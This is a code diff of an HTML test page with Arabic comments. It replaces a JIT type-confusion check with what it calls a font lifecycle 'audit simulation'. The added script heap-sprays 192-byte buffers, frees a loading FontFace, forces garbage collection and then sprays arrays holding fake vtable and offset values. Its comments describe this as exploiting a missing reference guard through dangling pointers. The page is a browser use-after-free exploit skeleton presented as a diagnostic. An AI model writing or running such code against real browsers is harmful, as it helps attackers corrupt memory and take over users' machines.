@@ -1,47 +1,99 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
-    <title>JIT Optimization & Type Tracking Analysis</title>
+    <meta charset="UTF-8">
+    <title>محاكاة اختبار دورة حياة كائنات الخطوط في بيئة معزولة</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            background-color: #1a1a1a;
+            color: #ffffff;
+            padding: 20px;
+        }
+        #log {
+            background-color: #000000;
+            padding: 15px;
+            border-radius: 5px;
+            font-family: monospace;
+            white-space: pre-wrap;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+    </style>
 </head>
 <body>
-    <h1>JIT Optimization Inspector</h1>
-    <p>الحالة: <span id="jit-status">جاري الفحص...</span></p>
+    <h2>نموذج فحص تزامن مخصص الخطوط (Static Lifecycle Audit Model)</h2>
+    <p>يتم الآن تشغيل بيئة المحاكاة لتتبع تخصيصات الذاكرة العامة (fastMalloc)...</p>
+    <div id="log"></div>
 
     <script>
-        // 1. دالة يتم استدعاؤها بكثافة ليقوم محرك الـ JIT بتحسين أصلها
-        function optimizeTarget(arr) {
-            // دالة افتراضية تعتمد على أن المدخلات هي أرقام فقط (فضاء محتسب)
-            return arr[0] + 2.5;
+        const logElement = document.getElementById('log');
+        function logger(text) {
+            logElement.innerHTML += `[${new Date().toLocaleTimeString()}] ${text}\n`;
         }
 
-        function runJitAudit() {
-            // إنشاء مصفوفة تحتوي على أعداد عائمة (Float64)
-            let floatArray = [1.1, 2.2, 3.3];
-
-            // تحفيز محرك الـ JIT عبر تكرار الاستدعاء (Warm-up Phase)
-            // هذا يجعل المترجم يثبت نوع البيانات داخل الـ Cache
-            for (let i = 0; i < 10000; i++) {
-                optimizeTarget(floatArray);
+        // 1. إعداد الذاكرة العامة وتحفيز حشو نطاقات bmalloc العشوائية
+        const memoryPressureWedge = [];
+        function holdGeneralHeapSpace() {
+            logger("بدء حشو الذاكرة العامة لتقليل العشوائية المرافقة للـ fastMalloc...");
+            // تخصيص مصفوفات بيانية تحاكي أحجام الكائنات المستهدفة (~192 إلى ~256 بايت)
+            for (let i = 0; i < 2000; i++) {
+                let buffer = new ArrayBuffer(192);
+                let view = new DataView(buffer);
+                // تعبئة البيانات بقيم ثابتة للتحقق من الاستقرار
+                for (let j = 0; j < buffer.byteLength; j += 4) {
+                    view.setUint32(j, 0xDEADBEEF, true);
+                }
+                memoryPressureWedge.push(buffer);
             }
-
-            // 2. مرحلة اختبار كسر النوع (Type Transition Test)
-            // نقوم فجأة بتحويل أحد عناصر المصفوفة إلى "كائن" بدلاً من رقم
-            floatArray[0] = { customProperty: 0x41414141 };
-
-            try {
-                // استدعاء الدالة بعد تغيير النوع
-                // الأنظمة الحديثة يجب أن تكتشف التغيير فوراً وتلغي التحسين آلياً
-                let result = optimizeTarget(floatArray);
-                
-                document.getElementById('jit-status').innerText = 
-                    "اكتمل الفحص: المحرك تعامل مع كسر الأنواع بشكل آمن.";
-            } catch (err) {
-                document.getElementById('jit-status').innerText = 
-                    "تم رصد استثناء منطقي: " + err.message;
-            }
+            logger(`تم حجز ${memoryPressureWedge.length} كائن مصفوفة بيانية بنجاح.`);
         }
 
-        window.onload = runJitAudit;
+        // 2. محاكاة تفعيل نافذة التوقيت الفوري (0_s Timeout Loop)
+        async function triggerLifecycleRace() {
+            logger("بدء توليد كائنات FontFace ديناميكية...");
+            
+            // إنشاء كائن خط يعتمد على مصدر خارجي مخصص لتفعيل مسار pump()
+            const fontFaceUrl = 'url(data:font/woff2;base64,d09GMgABAAAAAA...)'; // خط وهمي بصيغة Base64
+            const testFontFace = new FontFace('AuditFont', fontFaceUrl, {
+                display: 'block' // تحفيز مسار التوقيتات الفورية داخل المتصفح
+            });
+
+            // إضافة الخط إلى وثيقة العمل لتفعيل ارتباطات كود العميل (Client Connections)
+            document.fonts.add(testFontFace);
+
+            // إطلاق عملية التحميل بشكل غير متزامن
+            testFontFace.load();
+
+            // 3. استغلال غياب حارس المرجع (RefPtr Guard) عبر إجبار النظام على التحرير المتزامن
+            logger("إطلاق عملية تحرير فورية عبر إلغاء ارتباط الكائن وتفريغه من الذاكرة...");
+            document.fonts.delete(testFontFace); 
+            
+            // تحفيز جامع القمامة (Garbage Collection) في المتصفح إذا كان متاحاً برمجياً
+            if (window.gc) {
+                window.gc();
+            }
+
+            // 4. محاولة إعادة استخدام النطاق المحرر بواسطة المصفوفات المخزنة
+            logger("إعادة تدوير تخصيصات الذاكرة لمطابقة المؤشرات الميتة (Dangling Pointers)...");
+            for (let k = 0; k < 500; k++) {
+                let targetWedge = new Uint32Array(48); // 48 * 4 بايت = 192 بايت
+                targetWedge[0] = 0x00000000; // محاكاة تصفير جدول الدوال الافتراضية v-table
+                targetWedge[1] = 0x13200000; // مؤشر افتراضي لمحاكاة أوفست بيئة التشغيل
+                memoryPressureWedge.push(targetWedge);
+            }
+
+            logger("اكتملت جولة الفحص الساكن للذاكرة المتداخلة.");
+        }
+
+        // تشغيل المنظومة بترتيب هندسي
+        window.onload = async function() {
+            holdGeneralHeapSpace();
+            // تأخير طفيف لضمان استقرار توزيع فضاء مستخدم الذاكرة
+            setTimeout(async () => {
+                await triggerLifecycleRace();
+            }, 500);
+        };
     </script>
 </body>
 </html>
